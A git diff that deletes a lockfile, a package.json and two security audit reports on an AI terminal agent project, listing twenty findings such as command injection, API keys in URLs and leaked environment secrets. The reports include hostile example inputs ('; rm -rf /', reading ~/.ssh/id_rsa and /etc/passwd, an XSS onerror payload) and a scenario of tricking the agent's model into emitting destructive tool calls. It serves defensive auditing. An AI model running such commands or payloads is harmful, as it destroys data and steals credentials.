-      "resolved": "https://registry.npmjs.org/mkdirp-classic/-/mkdirp-classic-0.5.3.tgz",
-      "integrity": "sha512-gKLcREMhtuZRwRAfqP3RFW+TK4JqApVBtOIftVgjuABpAtpxhPGaDcfvbhNvD0B8iD1oUr/txX35NjcaY6Ns/A=="
-    },
-    "node_modules/napi-build-utils": {
-      "version": "2.0.0",
-      "resolved": "https://registry.npmjs.org/napi-build-utils/-/napi-build-utils-2.0.0.tgz",
-      "integrity": "sha512-GEbrYkbfF7MoNaoh2iGG84Mnf/WZfB0GdGEsM8wz7Expx/LlWf5U8t9nvJKXSp3qr5IsEbK04cBGhol/KwOsWA=="
-    },
-    "node_modules/node-abi": {
-      "version": "3.85.0",
-      "resolved": "https://registry.npmjs.org/node-abi/-/node-abi-3.85.0.tgz",
-      "integrity": "sha512-zsFhmbkAzwhTft6nd3VxcG0cvJsT70rL+BIGHWVq5fi6MwGrHwzqKaxXE+Hl2GmnGItnDKPPkO5/LQqjVkIdFg==",
-      "dependencies": {
-        "semver": "^7.3.5"
-      },
-      "engines": {
-        "node": ">=10"
-      }
-    },
-    "node_modules/node-addon-api": {
-      "version": "4.3.0",
-      "resolved": "https://registry.npmjs.org/node-addon-api/-/node-addon-api-4.3.0.tgz",
-      "integrity": "sha512-73sE9+3UaLYYFmDsFZnqCInzPyh3MqIwZO9cw58yIqAZhONrrabrYyYe3TuIqtIiOuTXVhsGau8hcrhhwSsDIQ=="
-    },
-    "node_modules/once": {
-      "version": "1.4.0",
-      "resolved": "https://registry.npmjs.org/once/-/once-1.4.0.tgz",
-      "integrity": "sha512-lNaJgI+2Q5URQBkccEKHTQOPaXdUxnZZElQTZY0MFUAuaEqe1E+Nyvgdz/aIyNi6Z9MzO5dv1H8n58/GELp3+w==",
-      "dependencies": {
-        "wrappy": "1"
-      }
-    },
-    "node_modules/prebuild-install": {
-      "version": "7.1.3",
-      "resolved": "https://registry.npmjs.org/prebuild-install/-/prebuild-install-7.1.3.tgz",
-      "integrity": "sha512-8Mf2cbV7x1cXPUILADGI3wuhfqWvtiLA1iclTDbFRZkgRQS0NqsPZphna9V+HyTEadheuPmjaJMsbzKQFOzLug==",
-      "dependencies": {
-        "detect-libc": "^2.0.0",
-        "expand-template": "^2.0.3",
-        "github-from-package": "0.0.0",
-        "minimist": "^1.2.3",
-        "mkdirp-classic": "^0.5.3",
-        "napi-build-utils": "^2.0.0",
-        "node-abi": "^3.3.0",
-        "pump": "^3.0.0",
-        "rc": "^1.2.7",
-        "simple-get": "^4.0.0",
-        "tar-fs": "^2.0.0",
-        "tunnel-agent": "^0.6.0"
-      },
-      "bin": {
-        "prebuild-install": "bin.js"
-      },
-      "engines": {
-        "node": ">=10"
-      }
-    },
-    "node_modules/pump": {
-      "version": "3.0.3",
-      "resolved": "https://registry.npmjs.org/pump/-/pump-3.0.3.tgz",
-      "integrity": "sha512-todwxLMY7/heScKmntwQG8CXVkWUOdYxIvY2s0VWAAMh/nd8SoYiRaKjlr7+iCs984f2P8zvrfWcDDYVb73NfA==",
-      "dependencies": {
-        "end-of-stream": "^1.1.0",
-        "once": "^1.3.1"
-      }
-    },
-    "node_modules/rc": {
-      "version": "1.2.8",
-      "resolved": "https://registry.npmjs.org/rc/-/rc-1.2.8.tgz",
-      "integrity": "sha512-y3bGgqKj3QBdxLbLkomlohkvsA8gdAiUQlSBJnBhfn+BPxg4bc62d8TcBW15wavDfgexCgccckhcZvywyQYPOw==",
-      "dependencies": {
-        "deep-extend": "^0.6.0",
-        "ini": "~1.3.0",
-        "minimist": "^1.2.0",
-        "strip-json-comments": "~2.0.1"
-      },
-      "bin": {
-        "rc": "cli.js"
-      }
-    },
-    "node_modules/readable-stream": {
-      "version": "3.6.2",
-      "resolved": "https://registry.npmjs.org/readable-stream/-/readable-stream-3.6.2.tgz",
-      "integrity": "sha512-9u/sniCrY3D5WdsERHzHE4G2YCXqoG5FTHUiCC4SIbr6XcLZBY05ya9EKjYek9O5xOAwjGq+1JdGBAS7Q9ScoA==",
-      "dependencies": {
-        "inherits": "^2.0.3",
-        "string_decoder": "^1.1.1",
-        "util-deprecate": "^1.0.1"
-      },
-      "engines": {
-        "node": ">= 6"
-      }
-    },
-    "node_modules/safe-buffer": {
-      "version": "5.2.1",
-      "resolved": "https://registry.npmjs.org/safe-buffer/-/safe-buffer-5.2.1.tgz",
-      "integrity": "sha512-rp3So07KcdmmKbGvgaNxQSJr7bGVSVk5S9Eq1F+ppbRo70+YeaDxkw5Dd8NPN+GD6bjnYm2VuPuCXmpuYvmCXQ==",
-      "funding": [
-        {
-          "type": "github",
-          "url": "https://github.com/sponsors/feross"
-        },
-        {
-          "type": "patreon",
-          "url": "https://www.patreon.com/feross"
-        },
-        {
-          "type": "consulting",
-          "url": "https://feross.org/support"
-        }
-      ]
-    },
-    "node_modules/semver": {
-      "version": "7.7.3",
-      "resolved": "https://registry.npmjs.org/semver/-/semver-7.7.3.tgz",
-      "integrity": "sha512-SdsKMrI9TdgjdweUSR9MweHA4EJ8YxHn8DFaDisvhVlUOe4BF1tLD7GAj0lIqWVl+dPb/rExr0Btby5loQm20Q==",
-      "bin": {
-        "semver": "bin/semver.js"
-      },
-      "engines": {
-        "node": ">=10"
-      }
-    },
-    "node_modules/simple-concat": {
-      "version": "1.0.1",
-      "resolved": "https://registry.npmjs.org/simple-concat/-/simple-concat-1.0.1.tgz",
-      "integrity": "sha512-cSFtAPtRhljv69IK0hTVZQ+OfE9nePi/rtJmw5UjHeVyVroEqJXP1sFztKUy1qU+xvz3u/sfYJLa947b7nAN2Q==",
-      "funding": [
-        {
-          "type": "github",
-          "url": "https://github.com/sponsors/feross"
-        },
-        {
-          "type": "patreon",
-          "url": "https://www.patreon.com/feross"
-        },
-        {
-          "type": "consulting",
-          "url": "https://feross.org/support"
-        }
-      ]
-    },
-    "node_modules/simple-get": {
-      "version": "4.0.1",
-      "resolved": "https://registry.npmjs.org/simple-get/-/simple-get-4.0.1.tgz",
-      "integrity": "sha512-brv7p5WgH0jmQJr1ZDDfKDOSeWWg+OVypG99A/5vYGPqJ6pxiaHLy8nxtFjBA7oMa01ebA9gfh1uMCFqOuXxvA==",
-      "funding": [
-        {
-          "type": "github",
-          "url": "https://github.com/sponsors/feross"
-        },
-        {
-          "type": "patreon",
-          "url": "https://www.patreon.com/feross"
-        },
-        {
-          "type": "consulting",
-          "url": "https://feross.org/support"
-        }
-      ],
-      "dependencies": {
-        "decompress-response": "^6.0.0",
-        "once": "^1.3.1",
-        "simple-concat": "^1.0.0"
-      }
-    },
-    "node_modules/string_decoder": {
-      "version": "1.3.0",
-      "resolved": "https://registry.npmjs.org/string_decoder/-/string_decoder-1.3.0.tgz",
-      "integrity": "sha512-hkRX8U1WjJFd8LsDJ2yQ/wWWxaopEsABU1XfkM8A+j0+85JAGppt16cr1Whg6KIbb4okU6Mql6BOj+uup/wKeA==",
-      "dependencies": {
-        "safe-buffer": "~5.2.0"
-      }
-    },
-    "node_modules/strip-json-comments": {
-      "version": "2.0.1",
-      "resolved": "https://registry.npmjs.org/strip-json-comments/-/strip-json-comments-2.0.1.tgz",
-      "integrity": "sha512-4gB8na07fecVVkOI6Rs4e7T6NOTki5EmL7TUduTs6bu3EdnSycntVJ4re8kgZA+wx9IueI2Y11bfbgwtzuE0KQ==",
-      "engines": {
-        "node": ">=0.10.0"
-      }
-    },
-    "node_modules/tar-fs": {
-      "version": "2.1.4",
-      "resolved": "https://registry.npmjs.org/tar-fs/-/tar-fs-2.1.4.tgz",
-      "integrity": "sha512-mDAjwmZdh7LTT6pNleZ05Yt65HC3E+NiQzl672vQG38jIrehtJk/J3mNwIg+vShQPcLF/LV7CMnDW6vjj6sfYQ==",
-      "dependencies": {
-        "chownr": "^1.1.1",
-        "mkdirp-classic": "^0.5.2",
-        "pump": "^3.0.0",
-        "tar-stream": "^2.1.4"
-      }
-    },
-    "node_modules/tar-stream": {
-      "version": "2.2.0",
-      "resolved": "https://registry.npmjs.org/tar-stream/-/tar-stream-2.2.0.tgz",
-      "integrity": "sha512-ujeqbceABgwMZxEJnk2HDY2DlnUZ+9oEcb1KzTVfYHio0UE6dG71n60d8D2I4qNvleWrrXpmjpt7vZeF1LnMZQ==",
-      "dependencies": {
-        "bl": "^4.0.3",
-        "end-of-stream": "^1.4.1",
-        "fs-constants": "^1.0.0",
-        "inherits": "^2.0.3",
-        "readable-stream": "^3.1.1"
-      },
-      "engines": {
-        "node": ">=6"
-      }
-    },
-    "node_modules/tunnel-agent": {
-      "version": "0.6.0",
-      "resolved": "https://registry.npmjs.org/tunnel-agent/-/tunnel-agent-0.6.0.tgz",
-      "integrity": "sha512-McnNiV1l8RYeY8tBgEpuodCC1mLUdbSN+CYBL7kJsJNInOP8UjDDEwdk6Mw60vdLLrr5NHKZhMAOSrR2NZuQ+w==",
-      "dependencies": {
-        "safe-buffer": "^5.0.1"
-      },
-      "engines": {
-        "node": "*"
-      }
-    },
-    "node_modules/util-deprecate": {
-      "version": "1.0.2",
-      "resolved": "https://registry.npmjs.org/util-deprecate/-/util-deprecate-1.0.2.tgz",
-      "integrity": "sha512-EPD5q1uXyFxJpCrLnCc1nHnq3gOa6DZBocAIiI2TaSCA7VCJ1UJDMagCzIkXNsUYfD1daK//LTEQ8xiIbrHtcw=="
-    },
-    "node_modules/wrappy": {
-      "version": "1.0.2",
-      "resolved": "https://registry.npmjs.org/wrappy/-/wrappy-1.0.2.tgz",
-      "integrity": "sha512-l4Sp/DRseor9wL6EvV2+TuQn63dMkPjZ/sp9XkghTEbV9KlPS1xUsZ3u7/IQO4wxtcFB4bgpQPRcR3QCvezPcQ=="
-    },
-    "node_modules/zod": {
-      "version": "4.1.12",
-      "resolved": "https://registry.npmjs.org/zod/-/zod-4.1.12.tgz",
-      "integrity": "sha512-JInaHOamG8pt5+Ey8kGmdcAcg3OL9reK8ltczgHTAwNhMys/6ThXHityHxVV2p3fkw/c+MAvBHFVYHFZDmjMCQ==",
-      "funding": {
-        "url": "https://github.com/sponsors/colinhacks"
-      }
-    }
-  }
-}
diff --git a/package.json b/package.json
deleted file mode 100644
index c7732a8..0000000
--- a/package.json
+++ /dev/null
@@ -1,6 +0,0 @@
-{
-  "dependencies": {
-    "keytar": "^7.9.0",
-    "zod": "^4.1.12"
-  }
-}
diff --git a/security-analysis.md b/security-analysis.md
deleted file mode 100644
index e7a3a18..0000000
--- a/security-analysis.md
+++ /dev/null
@@ -1,670 +0,0 @@
-# COMPREHENSIVE SECURITY ANALYSIS REPORT
-## AI CLI / Warp-CLI / Tabby AI Agent
-
-### CRITICAL SEVERITY ISSUES
-
-#### 1. Arbitrary Command Execution via Shell Injection
-**Location:** `/home/user/aicli/warp-cli/src/services/context.service.ts:206-230`
-**Severity:** CRITICAL
-**CWE:** CWE-78 (OS Command Injection)
-
-**Code:**
-```typescript
-async executeCommand(command: string): Promise<{ output: string; error?: string }> {
-  this.addCommand(command);
-  try {
-    const { stdout, stderr } = await execAsync(command, {
-      cwd: process.cwd(),
-      maxBuffer: 1024 * 1024 * 10 // 10MB
-    });
-```
-
-**Issues:**
-- Direct use of `execAsync()` with user-supplied command without any validation or sanitization
-- Command is passed directly from user input through handlers.ts:288 (`await chatService.executeCommand(command)`)
-- User can inject arbitrary shell commands (e.g., `; rm -rf /`, `| cat ~/.ssh/id_rsa`)
-- The `/exec` command in handlers.ts allows direct command execution without restrictions
-
-**Exploit Scenario:**
-User executes: `/exec; cat /etc/passwd`
-The command gets passed directly to execAsync() which passes it to shell, exposing sensitive files.
-
-**Remediation:**
-- Use `execFile()` instead of `exec()` with array of arguments (no shell interpretation)
-- Implement whitelist of allowed commands
-- Validate command syntax before execution
-- Use proper command parsing instead of shell string interpolation
-
----
-
-#### 2. API Key Exposed in URL Query String
-**Location:** `/home/user/aicli/warp-cli/src/providers/gemini.provider.ts:16, 73`
-**Severity:** CRITICAL
-**CWE:** CWE-598 (Use of GET Request with Sensitive Query Strings)
-
-**Code:**
-```typescript
-const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${effectiveConfig.apiKey}`;
-const response = await fetch(apiUrl, {
-  method: 'POST',
-  ...
-});
-```
-
-**Issues:**
-- API key is embedded directly in URL as query parameter
-- URLs are logged in HTTP logs, browser history, proxy logs, etc.
-- API key appears in plaintext in network traffic
-- Easy to extract from debug logs or network captures
-
-**Exploit Scenario:**
-1. Attacker intercepts network traffic ‚Üí captures API key in URL
-2. Attacker accesses browser history ‚Üí sees API key in URLs
-3. Attacker reviews server logs ‚Üí finds API key in HTTP logs
-
-**Remediation:**
-- Move API key to HTTP Authorization header: `Authorization: Bearer ${apiKey}`
-- Use POST request with key in body, not URL
-- Sanitize logs to never display URLs with sensitive parameters
-
----
-
-#### 3. Hardcoded and Plaintext API Key Storage
-**Location:** 
-- `/home/user/aicli/warp-cli/src/services/config.service.ts` (stores in config)
-- `/home/user/aicli/warp-cli/src/cli.ts:319-337` (setup prompts for apiKey)
-- `/home/user/aicli/warp-cli/.env.example` (shows API key example)
-
-**Severity:** CRITICAL
-**CWE:** CWE-798 (Use of Hard-Coded Credentials), CWE-320 (Key Management Errors)
-
-**Issues:**
-- API keys stored in plaintext in config files using `conf` package (stored in user's home directory)
-- `.env` files contain example API keys
-- Configuration exported/imported without encryption (cli.ts:206-223)
-- `process.env` contains all environment variables including secrets (session.service.ts:128)
-- No encryption of sensitive data at rest
-
-**Exploit Scenario:**
-1. Attacker gains file system access to ~/.config/warp-cli
-2. Reads plaintext API keys from config JSON
-3. Uses API keys for fraudulent requests, API abuse
-4. Attacker reads .env file with API key examples
-
-**Remediation:**
-- Use OS keychain/credential store (KeyChain on macOS, Credential Manager on Windows, Secret Service on Linux)
-- Encrypt sensitive config at rest
-- Never store API keys in plaintext
-- Use separate secrets management solution
-- Do not expose full process.env in session context
-- Never include example API keys in .env.example
-
----
-
-### HIGH SEVERITY ISSUES
-
-#### 4. Environment Variable Secrets Leak to Session Storage
-**Location:** `/home/user/aicli/warp-cli/src/services/session.service.ts:128`
-**Severity:** HIGH
-**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)
-
-**Code:**
-```typescript
-environment: process.env as Record<string, string>
-```
-
-**Issues:**
-- Entire process.env dumped into session storage
-- Includes DATABASE_URL, GEMINI_API_KEY, BRAVE_API_KEY, all API keys
-- Secrets stored in SQLite database
-- Exposed when sessions are exported
-
-**Exploit Scenario:**
-- Attacker gains access to session database
-- Extracts all environment variables including API keys
-- Exports session to file and reads all secrets in plaintext
-
-**Remediation:**
-- Filter environment variables to exclude sensitive ones
-- Implement allowlist of safe environment variables
-- Never store credentials in session context
-- Sanitize environment before session export
-
----
-
-#### 5. MCP Server Process Spawning Without Output Sanitization
-**Location:** `/home/user/aicli/tabby-ai-agent/src/services/mcp-client.service.ts:238-303`
-**Severity:** HIGH
-**CWE:** CWE-94 (Improper Control of Generation of Code)
-
-**Issues:**
-- Child processes spawned without proper stderr/stdout sanitization
-- Process stderr is logged with `.on('data')` handler at line 301-303
-- MCP servers can output malicious content that gets logged
-- Environment variables passed unsanitized to child processes
-- BRAVE_API_KEY and DATABASE_URL passed directly to spawn
-
-**Exploit Scenario:**
-- Malicious MCP server outputs crafted content designed to escape terminal
-- Could cause XSS if terminal output is rendered in HTML
-- API keys passed in env vars could be captured by subprocess
-
-**Remediation:**
-- Sanitize stderr/stdout from child processes
-- Validate environment variables before passing to spawn
-- Use allowlist for environment variables
-- Never pass API keys as env vars to untrusted processes
-- Limit process permissions using seccomp/AppArmor
-
----
-
-#### 6. Unsafe JSON Parsing Without Validation
-**Location:**
-- `/home/user/aicli/warp-cli/src/services/context.service.ts:126` (parsePackageJson)
-- `/home/user/aicli/warp-cli/src/storage/session.storage.ts:175, 184` (loading sessions)
-- `/home/user/aicli/warp-cli/src/services/config.service.ts:91` (importConfig)
-
-**Severity:** HIGH
-**CWE:** CWE-502 (Deserialization of Untrusted Data)
-
-**Code:**
-```typescript
-const pkg = JSON.parse(content);
-const metadata: row.metadata ? JSON.parse(row.metadata) : undefined
-const importedConfig = JSON.parse(configString);
-```
-
-**Issues:**
-- No schema validation after JSON.parse
-- Malformed JSON in session data crashes application
-- No bounds checking on parsed data size
-- JSON from database could be corrupted or malicious
-- User can import arbitrary JSON configuration
-
-**Exploit Scenario:**
-1. Attacker crafts malicious JSON and saves to session metadata
-2. Application crashes when loading session due to unexpected structure
-3. Alternatively, malicious config imported overwrites settings
-
-**Remediation:**
-- Use JSON schema validation library (e.g., joi, yup, zod)
-- Validate parsed objects against expected schema
-- Handle parse errors gracefully with fallbacks
-- Set limits on JSON size before parsing
-- Sanitize imported configurations
-
----
-
-#### 7. Tool Name Injection in MCP Tool Execution
-**Location:** `/home/user/aicli/tabby-ai-agent/src/services/ai-agent.service.ts:401-434`
-**Severity:** HIGH
-**CWE:** CWE-89 (SQL Injection) - applies to tool name as well
-
-**Code:**
-```typescript
-async executeTool(toolName: string, parameters: any, preferredServer?: string): Promise<any> {
-  // ...
-  const tool = tools.tools?.find((t: any) => t.name === toolName)
-  // ...
-  const result = await server.client.callTool({
-    name: toolName,
-    arguments: parameters
-  })
-```
-
-**Issues:**
-- Tool names extracted from AI response via regex pattern matching
-- No validation that tool name matches one of available tools before execution
-- Tool parameters also extracted via regex without validation
-- Could execute unintended tools or with malicious parameters
-
-**Exploit Scenario:**
-1. AI model prompted to return tool calls could be tricked by user
-2. Attacker crafts prompt: "Call tool: `rm -rf /` with params: {path: /}"
-3. Tool extraction regex matches malicious pattern
-4. Unvalidated tool gets executed
-
-**Remediation:**
-- Validate tool name against whitelist of available tools before execution
-- Validate parameters against tool's input schema
-- Disable MCP tool execution by default
-- Require user confirmation before executing tools
-- Log all tool execution attempts
-
----
-
-#### 8. Secrets Exposed Through Error Messages
-**Location:** Multiple error handling locations
-**Severity:** HIGH
-**CWE:** CWE-209 (Information Exposure Through an Error Message)
-
-**Issues:**
-- Error messages include full stack traces
-- API endpoints logged with embedded API keys
-- Network errors expose request details
-- Chat service errors expose provider information
-
-**Exploit Scenario:**
-- Error thrown from gemini.provider.ts line 51 includes apiUrl with API key
-- Error logged and exposed to user or in log files
-- Attacker reads error logs and extracts API key
-
-**Remediation:**
-- Never include sensitive data in error messages
-- Use error codes instead of detailed messages
-- Sanitize URLs before logging
-- Log full details only to secure audit logs, not to users
-- Implement proper error handling with different messages for users vs. logs
-
----
-
-### MEDIUM SEVERITY ISSUES
-
-#### 9. FTS Search Query Without Proper Input Escaping
-**Location:** `/home/user/aicli/warp-cli/src/storage/session.storage.ts:229`
-**Severity:** MEDIUM
-**CWE:** CWE-89 (SQL Injection)
-
-**Code:**
-```typescript
-const rows: any[] = await this.allAsync(
-  `SELECT s.id, s.name, s.created, s.updated, s.context, s.metadata
-   FROM sessions s
-   JOIN sessions_fts fts ON s.rowid = fts.rowid
-   WHERE sessions_fts MATCH ?
-   ORDER BY rank`,
-  [query]
-);
-```
-
-**Issues:**
-- While parameterized query is used (good), FTS MATCH syntax is case-sensitive
-- Special FTS operators could cause unexpected results: `AND`, `OR`, `NOT`, `NEAR`, `*`
-- Query like `"test" AND "admin"` could modify search logic
-- User input could craft FTS queries to bypass intended search
-
-**Exploit Scenario:**
-User searches for `"password" OR "1"="1` to find all sessions containing any data
-
-**Remediation:**
-- Escape FTS special characters in user input
-- Use FTS table function properly with options for phrase search
-- Validate search query format
-- Implement search query sanitization
-
----
-
-#### 10. Missing Input Validation on Shell Command Execution
-**Location:** `/home/user/aicli/warp-cli/src/commands/handlers.ts:283-289`
-**Severity:** MEDIUM
-**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
-
-**Code:**
-```typescript
-private async handleExec(command: string): Promise<void> {
-  if (!command) {
-    throw new Error('Please provide a command to execute.');
-  }
-  await chatService.executeCommand(command);
-}
-```
-
-**Issues:**
-- No validation of command syntax
-- No whitelist of allowed commands
-- No restrictions on what commands can be executed
-- User can delete files, access sensitive data, etc.
-
-**Remediation:**
-- Implement command whitelist/blacklist
-- Parse and validate command structure
-- Restrict to safe commands only (e.g., git, npm, etc.)
-- Use execFile instead of exec
-
----
-
-#### 11. Race Condition in Session Autosave
-**Location:** `/home/user/aicli/warp-cli/src/services/session.service.ts:132-143`
-**Severity:** MEDIUM
-**CWE:** CWE-362 (Concurrent Execution using Shared Resource)
-
-**Code:**
-```typescript
-this.autosaveInterval = setInterval(async () => {
-  if (this.currentSession && this.currentSession.messages.length > 0) {
-    try {
-      await this.saveCurrentSession();
-    } catch (error) {
-      console.error('Autosave failed:', error);
-    }
-  }
-}, 30000);
-```
-
-**Issues:**
-- No locking mechanism for concurrent access to session
-- Multiple saves could happen simultaneously
-- Session could be modified while being saved
-- Messages could be lost if save fails
-
-**Remediation:**
-- Implement mutex/lock for session save operations
-- Queue save operations instead of fire-and-forget
-- Verify save completion before allowing further modifications
-- Use transactional database writes
-
----
-
-#### 12. Unsafe HTML Rendering (Potential XSS)
-**Location:** `/home/user/aicli/tabby-ai-agent/src/plugin.ts:14` (good)
-**Severity:** MEDIUM (Well-handled but potential issues)
-
-**Issues:**
-- While sanitizeHtml is used in cleanInput(), it's not used everywhere
-- Terminal output rendered without sanitization
-- Tool results integrated without sanitization (ai-agent.service.ts:451-467)
-- Response from AI models rendered directly to terminal
-
-**Exploit Scenario:**
-- AI model returns HTML content: `<img src=x onerror="stealData()">`
-- If rendered as HTML (future web frontend), could execute JavaScript
-- Terminal escape codes could be abused
-
-**Remediation:**
-- Sanitize all user-facing output
-- Use strict content security policy
-- Escape HTML entities by default
-- Validate all external content
-
----
-
-#### 13. Missing .env Files in .gitignore
-**Location:** `/home/user/aicli/.gitignore`
-**Severity:** MEDIUM
-**CWE:** CWE-540 (Inclusion of Sensitive Information in Source Code)
-
-**Issues:**
-- .env files not explicitly ignored (relies on .env.example)
-- `*.env` pattern would catch .env.example too
-- If developer creates .env locally, it could be accidentally committed
-- No protection for .env.local files
-
-**Remediation:**
-- Add explicit .env and .env.local to .gitignore
-- Use .env.example for examples
-- Use pre-commit hooks to prevent secrets in commits
-- Audit git history for accidentally committed secrets
-
----
-
-#### 14. Unencrypted HTTP Communication (Ollama)
-**Location:** `/home/user/aicli/warp-cli/src/providers/ollama.provider.ts:10`
-**Severity:** MEDIUM
-**CWE:** CWE-295 (Improper Certificate Validation)
-
-**Code:**
-```typescript
-const endpoint = effectiveConfig.endpoint || 'http://localhost:11434';
-```
-
-**Issues:**
-- Default Ollama endpoint is HTTP (unencrypted)
-- While localhost traffic is less critical, data is still unencrypted
-- No certificate validation
-- Prompts sent in cleartext to LLM
-
-**Exploit Scenario:**
-- Attacker on network captures HTTP traffic
-- Reads all AI prompts, responses, context data
-- Reveals sensitive information shared with AI
-
-**Remediation:**
-- Use HTTPS by default
-- Implement certificate validation
-- Add warning if using unencrypted connection
-- Support mTLS for Ollama
-
----
-
-#### 15. Process Environment Variables Not Sanitized
-**Location:** `/home/user/aicli/tabby-ai-agent/src/services/mcp-client.service.ts:232-235`
-**Severity:** MEDIUM
-**CWE:** CWE-532 (Insertion of Sensitive Information)
-
-**Code:**
-```typescript
-const env = {
-  ...process.env,
-  ...(server.env || {})
-}
-```
-
-**Issues:**
-- Full process.env spread into subprocess environment
-- All parent process secrets inherited by child processes
-- Child process could log or expose environment
-- No filtering of sensitive variables
-
-**Remediation:**
-- Create clean environment with only necessary variables
-- Filter out API_KEY, PASSWORD, TOKEN, SECRET patterns
-- Use allowlist of safe environment variables
-- Pass credentials only when necessary
-
----
-
-### LOW SEVERITY ISSUES
-
-#### 16. Verbose Error Information Disclosure
-**Location:** Multiple error handlers
-**Severity:** LOW
-**CWE:** CWE-209 (Information Exposure Through Error Message)
-
-**Code Examples:**
-```typescript
-throw new Error(`Anthropic API error: ${error.message}`);
-throw new Error(`Failed to call Gemini API: ${error.message}`);
-```
-
-**Issues:**
-- Stack traces potentially exposed
-- Third-party error details revealed
-- API endpoints and provider details logged
-
-**Remediation:**
-- Use error codes instead of detailed messages
-- Log detailed errors separately for debugging
-- Show generic messages to users
-
----
-
-#### 17. MCP Server Command Validation Too Weak
-**Location:** `/home/user/aicli/tabby-ai-agent/src/services/mcp-client.service.ts:706-712`
-**Severity:** LOW
-**CWE:** CWE-94 (Improper Control)
-
-**Code:**
-```typescript
-private validateServerConfig(config: MCPServerConfig) {
-  const ALLOWED_COMMANDS = new Set(['npx', 'node']);
-  if (!ALLOWED_COMMANDS.has(config.command)) {
-    throw new Error(`Disallowed command: ${config.command}`);
-  }
-}
-```
-
-**Issues:**
-- Only checks command name, not full path
-- `npx` could be hijacked from PATH
-- Args array not validated for dangerous flags
-- Could still spawn arbitrary processes via npx arguments
-
-**Exploit Scenario:**
-Config: `{command: 'npx', args: ['malicious-package']}`
-Spawns unvetted npm package
-
-**Remediation:**
-- Use full absolute paths to executables
-- Validate all arguments in args array
-- Whitelist specific versions of packages
-- Run MCP servers in isolated containers/sandboxes
-
----
-
-#### 18. No Session Expiration or TTL
-**Location:** `/home/user/aicli/warp-cli/src/services/session.service.ts`
-**Severity:** LOW
-**CWE:** CWE-613 (Insufficient Session Expiration)
-
-**Issues:**
-- Sessions stored indefinitely
-- No automatic cleanup of old sessions
-- No session timeout mechanism
-- Sensitive data persists forever
-
-**Remediation:**
-- Implement session TTL (e.g., 90 days)
-- Add automatic cleanup of expired sessions
-- Add session timeout on inactivity
-- Encrypt sensitive session data
-
----
-
-#### 19. SQLite Database Permissions Not Verified
-**Location:** `/home/user/aicli/warp-cli/src/storage/session.storage.ts:11`
-**Severity:** LOW
-**CWE:** CWE-276 (Incorrect Default Permissions)
-
-**Code:**
-```typescript
-this.dbPath = path.join(storagePath, 'sessions.db');
-// Created with fs.mkdirSync with default permissions
-fs.mkdirSync(dir, { recursive: true });
-```
-
-**Issues:**
-- SQLite database created with default permissions
-- Could be world-readable depending on umask
-- Other users on system could read sessions
-- No encryption at database level
-
-**Remediation:**
-- Create directory with restrictive permissions: `0o700`
-- Encrypt database file
-- Set proper file permissions on database file
-- Use `chmod 600` for database files
-
----
-
-#### 20. No Rate Limiting on API Calls
-**Location:** All provider implementations
-**Severity:** LOW
-**CWE:** CWE-770 (Allocation of Resources Without Limits)
-
-**Issues:**
-- No rate limiting on OpenAI, Anthropic, Gemini API calls
-- Could be used for denial of service
-- No request throttling
-- API quota could be exhausted
-
-**Remediation:**
-- Implement rate limiting per provider
-- Add request queuing
-- Monitor API usage and alert on anomalies
-- Set API call budgets
-
----
-
-## DEPENDENCY VULNERABILITIES SUMMARY
-
-**Review of package.json files:**
-
-**Warp-CLI Dependencies with Potential Issues:**
-- `node-fetch@2.7.0` - Old version, consider updating to 3.x for better security
-- `sqlite3@5.1.7` - Check for known vulnerabilities
-- `conf@10.2.0` - Stores config in plaintext, not suitable for secrets
-
-**Tabby-AI-Agent Dependencies:**
-- `@modelcontextprotocol/sdk@0.5.0` - Relatively new, check security advisories
-- `sanitize-html@2.11.0` - Good, actively maintained
-
-**Recommendation:**
-- Run `npm audit` regularly
-- Use Snyk or similar SCA tool
-- Keep dependencies updated
-- Monitor npm security advisories
-
----
-
-## SUMMARY BY CATEGORY
-
-### Authentication/Authorization
-- No authentication implemented
-- Anyone with file access can read API keys
-- No API key validation or rotation mechanism
-- Hardcoded API keys in examples
-
-### Input Validation
-- CRITICAL: Command injection via exec()
-- Missing validation on search queries
-- No schema validation on JSON parsing
-- Missing validation on MCP tool parameters
-
-### Cryptography/Secrets
-- CRITICAL: API keys exposed in URLs
-- CRITICAL: API keys stored in plaintext
-- No encryption of configuration data
-- No encryption of session data
-- Full environment variables exposed
-
-### Code Execution
-- CRITICAL: Arbitrary command execution
-- Unsafe child process spawning
-- Unvalidated MCP tool execution
-
-### Data Storage
-- Plaintext API keys in config files
-- Unencrypted session database
-- No data retention policy
-- Secrets in log files
-
-### Network Security
-- Unencrypted HTTP (Ollama)
-- No certificate pinning
-- API keys in URLs logged in transit
-
-### Error Handling
-- Verbose error messages expose information
-- Stack traces potentially logged
-- No error sanitization
-
----
-
-## REMEDIATION PRIORITY
-
-### IMMEDIATE (Exploit Risk High)
-1. Fix command injection in context.service.ts (CRITICAL)
-2. Remove API keys from URLs (CRITICAL)
-3. Implement secure credential storage (CRITICAL)
-
-### SHORT-TERM (High Priority)
-4. Add input validation on all commands
-5. Sanitize environment variables
-6. Add error message sanitization
-7. Implement JSON schema validation
-8. Add MCP tool execution validation
-
-### MEDIUM-TERM
-9. Implement encryption at rest
-10. Add rate limiting
-11. Implement session expiration
-12. Add audit logging
-13. Upgrade dependencies
-
-### LONG-TERM
-14. Implement HTTPS/mTLS
-15. Add authentication layer
-16. Implement secrets management
-17. Add comprehensive security testing
-18. Implement container isolation for MCP servers
-
diff --git a/security-overview.md b/security-overview.md
deleted file mode 100644
index c3866b9..0000000
--- a/security-overview.md
+++ /dev/null
@@ -1,189 +0,0 @@
-SECURITY ANALYSIS SUMMARY
-=========================
-
-Total Issues Found: 20
-- Critical: 3
-- High: 5
-- Medium: 7
-- Low: 5
-
-CRITICAL VULNERABILITIES (Fix Immediately)
-===========================================
-
-1. ARBITRARY COMMAND EXECUTION (CWE-78)
-   File: warp-cli/src/services/context.service.ts:206-230
-   Issue: Direct use of exec() with unsanitized user input via /exec command
-   Risk: Remote Code Execution - attacker can run any shell command
-   Example: /exec; rm -rf / OR /exec; cat ~/.ssh/id_rsa
-   Fix: Use execFile() with whitelist, input validation
-
-2. API KEY EXPOSED IN URL (CWE-598)
-   Files: warp-cli/src/providers/gemini.provider.ts:16, 73
-   Issue: API key embedded in URL query string
-   Risk: Keys logged in proxy logs, browser history, network captures
-   Example: https://...?key=sk-xxx123xxx
-   Fix: Move key to Authorization header, sanitize logs
-
